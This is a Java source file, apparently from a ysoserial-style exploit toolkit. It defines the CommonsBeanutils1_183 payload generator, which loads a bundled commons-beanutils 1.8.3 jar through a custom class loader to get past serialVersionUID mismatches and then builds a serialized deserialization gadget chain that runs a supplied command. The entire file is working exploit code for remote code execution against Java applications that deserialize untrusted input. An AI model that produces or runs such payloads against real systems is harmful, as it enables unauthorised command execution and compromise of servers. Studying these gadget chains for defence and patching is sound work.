package ys.payloads;

import ys.payloads.annotation.Authors;
import ys.payloads.annotation.Dependencies;
import ys.payloads.util.CommonUtil;
import ys.payloads.util.PayloadRunner;
import ys.payloads.util.SuidClassLoader;

import java.io.InputStream;
import java.lang.reflect.Method;

import static ys.payloads.util.ClassFiles.classAsBytes;

@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF,Authors.CONY1 })
public class CommonsBeanutils1_183 extends Object implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        ClassLoader oldClassLoader = Thread.currentThread().getContextClassLoader();
        SuidClassLoader suidClassLoader = new SuidClassLoader();
        // 将Gadget class添加到自定义ClassLoader中
        suidClassLoader.addClass(CommonsBeanutils1.class.getName(),classAsBytes(CommonsBeanutils1.class));
        // 从资源目录读取commons-beanutils-1.8.3.jar的base64数据
        InputStream is = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream("commons-beanutils-1.8.3.jar");
        byte[] jarBytes = CommonUtil.readBytesFromInputStream(is);
        // 将Gadget不一致jar添加到自定义ClassLoader中
        suidClassLoader.addJar(jarBytes);
        Thread.currentThread().setContextClassLoader(suidClassLoader);
        Class clsGadget = suidClassLoader.loadClass("ys.payloads.CommonsBeanutils1");
        // 判断存在serialVesionUID不一致问题的class是否是由自定义ClassLoader加载的
        Class clsBeanComparator = suidClassLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        if(clsBeanComparator.getClassLoader().equals(suidClassLoader)){
            // 使用自定义ClassLoader加载的Gadget class创建对象，调用其getObject构建序列化对象
            Object objGadget = clsGadget.newInstance();
            Method getObject = objGadget.getClass().getDeclaredMethod("getObject", String.class);
            Object objPayload = getObject.invoke(objGadget,command);
            suidClassLoader.cleanLoader();
            Thread.currentThread().setContextClassLoader(oldClassLoader);
            return objPayload;
        }else{
            System.out.println("Class is not SuidClassLoader loading, serialization failure!");
            Thread.currentThread().setContextClassLoader(oldClassLoader);
            return null;
        }
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1_183.class, args);
    }
}